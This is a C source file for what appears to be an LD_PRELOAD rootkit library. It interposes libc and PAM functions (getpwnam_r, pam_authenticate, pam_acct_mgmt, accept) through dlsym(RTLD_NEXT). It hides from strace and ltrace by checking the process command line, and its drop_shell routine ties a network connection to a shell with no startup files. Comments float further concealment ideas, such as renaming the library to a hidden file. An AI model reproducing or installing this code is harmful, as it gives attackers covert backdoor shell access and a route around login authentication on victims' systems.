#include <dlfcn.h>
#include <stdbool.h>

void init(void) __attribute__((constructor));
void fini(void) __attribute__((destructor));
void drop_shell(int fd);
int  watchdog(char *func);

enum libcall_refs
{
    GETPWNAM_R,
    PAM_AUTHENTICATE,
    PAM_ACCT_MGMT,
    ACCEPT,
    N_LIBCALLS    /* Number of interposed libc functions. */
};

const void *(*libcalls[N_LIBCALLS])();
bool lib_loaded = true;    /* Non-constant global. Not my problem, bitch. (I'll come back for you later, my love.) */

void init(void)
{
    int i;
    FILE *handle;
    char caller[255];

    const char *libc_names[] = \
    {
        "getpwnam_r",
        "pam_authenticate",
        "pam_acct_mgmt",
        "accept"
    };

    if((handle = fopen("/proc/self/cmdline", "r")))
    {
        fread(caller, sizeof(caller), 1, handle);
        fclose(handle);

        if(watchdog(caller))
        {
            /* system("mv h0h0.so .h0h0.so"); */        /* Silly idea? */
            /* freopen("/dev/null", "w", stderr); */    /* {s,l}trace writes to stderr (try something else). */

            lib_loaded = false;
        }
    }

    /* Initialise: pointers to libc functions. */
    for(i = 0; i < N_LIBCALLS; i++)
        libcalls[i] = dlsym(RTLD_NEXT, libc_names[i]);
}

void fini(void)
{
    if(!lib_loaded)
    {
        /* system("mv .h0h0.so h0h0.so"); */
        /* fclose(stderr); */
    }
}

void drop_shell(int fd)
{
    char *argv[] = {SHELL_PATH, "--norc", NULL};
    char *envp[] = {NULL};

    if(fork() == 0)
    {
        dup2(fd, 0);
        dup2(fd, 1);
        dup2(fd, 2);

        execve(argv[0], argv, envp);
    }
}

int watchdog(char *func)
{
    size_t i, wd_size;
    const char *watchdogs[] = \
    {
        /* "ldd", -- bash script (caller = "/bin/bash" -- getenv("_") would be unportable/unreliable I think...) */
        "strace",
        "ltrace"
    };

    wd_size = sizeof watchdogs / sizeof watchdogs[0];

    for(i = 0; i < wd_size; i++)
        if(strncmp(watchdogs[i], func, strlen(func)) == 0)
            return 1;

    return 0;
}
